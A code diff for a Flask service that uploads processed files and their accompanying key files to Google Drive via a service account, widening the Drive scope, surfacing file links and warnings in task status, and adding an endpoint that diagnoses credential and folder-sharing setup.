@@ -129,7 +129,7 @@ def get_drive_service():
         creds_data = json.loads(creds_json_str)
         creds = service_account.Credentials.from_service_account_info(
             creds_data,
-            scopes=["https://www.googleapis.com/auth/drive.file"]
+            scopes=["https://www.googleapis.com/auth/drive"]
         )
         return build("drive", "v3", credentials=creds, cache_discovery=False)
     except Exception as e:
@@ -152,12 +152,19 @@ def upload_to_drive_resumable(drive_service, file_path: str, filename: str, task
     Uploads a file to Google Drive using 5MB resumable chunks without loading into RAM.
     """
     if not drive_service:
-        logger.info(f"Drive service not configured. Simulating drive upload for {filename}.")
-        return "simulated_drive_id_" + os.urandom(4).hex()
+        msg = "Drive service not configured. Set GOOGLE_APPLICATION_CREDENTIALS_JSON in Render."
+        logger.warning(msg)
+        with task_lock:
+            if task_id in active_tasks:
+                active_tasks[task_id]["drive_warning"] = msg
+        return None
 
+    clean_folder_id = DRIVE_FOLDER_ID.strip() if DRIVE_FOLDER_ID else ""
     file_metadata = {"name": filename}
-    if DRIVE_FOLDER_ID:
-        file_metadata["parents"] = [DRIVE_FOLDER_ID]
+    if clean_folder_id:
+        file_metadata["parents"] = [clean_folder_id]
+    else:
+        logger.warning("DRIVE_FOLDER_ID is empty! File will upload to service account's root drive and will not show in your personal Google Drive.")
 
     media = MediaFileUpload(
         file_path,
@@ -168,7 +175,8 @@ def upload_to_drive_resumable(drive_service, file_path: str, filename: str, task
     request_drive = drive_service.files().create(
         body=file_metadata,
         media_body=media,
-        fields="id, name"
+        fields="id, name, webViewLink, parents",
+        supportsAllDrives=True
     )
 
     response = None
@@ -181,7 +189,15 @@ def upload_to_drive_resumable(drive_service, file_path: str, filename: str, task
                     active_tasks[task_id]["drive_progress"] = percent
                     active_tasks[task_id]["progress"] = 20 + int(percent * 0.35)  # 20% -> 55%
 
-    return response.get("id")
+    file_id = response.get("id")
+    web_link = response.get("webViewLink", "")
+    with task_lock:
+        if task_id in active_tasks:
+            if is_large_file:
+                active_tasks[task_id]["drive_file_link"] = web_link
+            else:
+                active_tasks[task_id]["keylog_file_link"] = web_link
+    return file_id
 
 
 def derive_user_aes_key(password: str, salt: bytes) -> bytes:
@@ -435,9 +451,76 @@ def get_task_status(task_id: str):
             "progress": task["progress"],
             "data_drive_id": task.get("data_drive_id"),
             "keylog_drive_id": task.get("keylog_drive_id"),
+            "drive_file_link": task.get("drive_file_link"),
+            "keylog_file_link": task.get("keylog_file_link"),
+            "drive_warning": task.get("drive_warning"),
             "output_filename": task.get("output_filename"),
             "error": task.get("error")
         })
+
+
+@app.route("/api/drive/diagnose", methods=["GET"])
+@require_auth
+def drive_diagnose():
+    """Diagnoses Google Drive setup and guides user on folder sharing."""
+    creds_str = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS_JSON", "").strip()
+    folder_id = os.environ.get("DRIVE_FOLDER_ID", "").strip()
+
+    if not creds_str:
+        return jsonify({
+            "configured": False,
+            "error": "GOOGLE_APPLICATION_CREDENTIALS_JSON is missing in Render environment variables."
+        })
+
+    try:
+        if creds_str.startswith("'") and creds_str.endswith("'"):
+            creds_str = creds_str[1:-1]
+        elif creds_str.startswith('"') and creds_str.endswith('"'):
+            creds_str = creds_str[1:-1]
+        creds_data = json.loads(creds_str)
+        client_email = creds_data.get("client_email", "Unknown")
+        project_id = creds_data.get("project_id", "Unknown")
+    except Exception as e:
+        return jsonify({
+            "configured": False,
+            "error": f"Invalid JSON in GOOGLE_APPLICATION_CREDENTIALS_JSON: {str(e)}"
+        })
+
+    service = get_drive_service()
+    if not service:
+        return jsonify({
+            "configured": False,
+            "client_email": client_email,
+            "error": "Failed to create Google Drive API client. Check service account permissions."
+        })
+
+    result = {
+        "configured": True,
+        "client_email": client_email,
+        "project_id": project_id,
+        "folder_id_set": bool(folder_id),
+        "folder_id": folder_id
+    }
+
+    if folder_id:
+        try:
+            folder_info = service.files().get(
+                fileId=folder_id,
+                fields="id, name, capabilities",
+                supportsAllDrives=True
+            ).execute()
+            result["folder_accessible"] = True
+            result["folder_name"] = folder_info.get("name")
+            result["message"] = f"Connected successfully! Folder '{folder_info.get('name')}' is accessible by {client_email}."
+        except Exception as e:
+            result["folder_accessible"] = False
+            result["error"] = f"Folder not accessible: {str(e)}"
+            result["instruction"] = f"IMPORTANT: Open Google Drive, right-click the folder, click 'Share', and add '{client_email}' with 'Editor' permissions."
+    else:
+        result["folder_accessible"] = False
+        result["instruction"] = f"DRIVE_FOLDER_ID is not set in Render! Uploads will go to the service account's private drive and will NOT appear in your personal Google Drive. Create a folder in Google Drive, copy its ID from the URL, share it with '{client_email}' as Editor, and set DRIVE_FOLDER_ID=<folder_id> in Render."
+
+    return jsonify(result)
 
 
 @app.route("/api/download/<task_id>", methods=["GET"])
